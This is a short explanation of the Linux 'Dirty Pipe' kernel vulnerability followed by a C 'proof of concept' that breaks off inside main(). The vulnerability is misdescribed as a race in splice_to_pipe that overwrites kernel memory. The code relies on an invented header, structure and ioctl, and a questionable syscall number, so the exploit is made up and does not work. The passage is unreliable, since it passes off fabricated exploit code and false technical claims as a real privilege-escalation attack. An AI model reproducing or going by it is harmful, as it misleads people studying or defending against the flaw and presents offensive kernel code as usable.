The Dirty Pipe vulnerability in the Linux kernel allows for arbitrary read and write operations on the kernel's pipe infrastructure, potentially enabling privilege escalation. This exploit works by leveraging a race condition in the `splice_to_pipe` function to overwrite kernel memory.

Here’s a basic PoC for the Dirty Pipe vulnerability:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/pipe_fs.h>
#include <sys/uio.h>
#include <string.h>

// Define the syscall number for memfd_secret
#define __NR_memfd_secret 436

// Function to create a memfd_secret
int memfd_secret(unsigned int flags) {
    return syscall(__NR_memfd_secret, flags);
}

// Function to exploit Dirty Pipe
void exploit_dirty_pipe() {
    int pipefd[2];
    int mfd;
    char *buf;
    struct iovec iov;
    struct pipe_ioc_ctl_splice s;

    // Create a pipe
    if (pipe(pipefd) < 0) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    // Create a memfd_secret
    mfd = memfd_secret(0);
    if (mfd < 0) {
        perror("memfd_secret");
        exit(EXIT_FAILURE);
    }

    // Map the memfd_secret
    buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    // Prepare iovec for splice
    iov.iov_base = buf;
    iov.iov_len = 4096;

    // Prepare the splice structure
    s.fd = pipefd[1];
    s.len = 4096;

    // Perform the splice
    if (ioctl(pipefd[0], IOC_PIPE, &s) < 0) {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    // Write to the pipe
    write(pipefd[1], "A", 1);

    // Read from the pipe
    read(pipefd[0], buf, 1);

    // Clean up
    close(pipefd[0]);
    close(pipefd[1]);
    close(mfd);
}

int main() {
    // Exploit Dirty Pipe
    exploit_dirty_pipe();

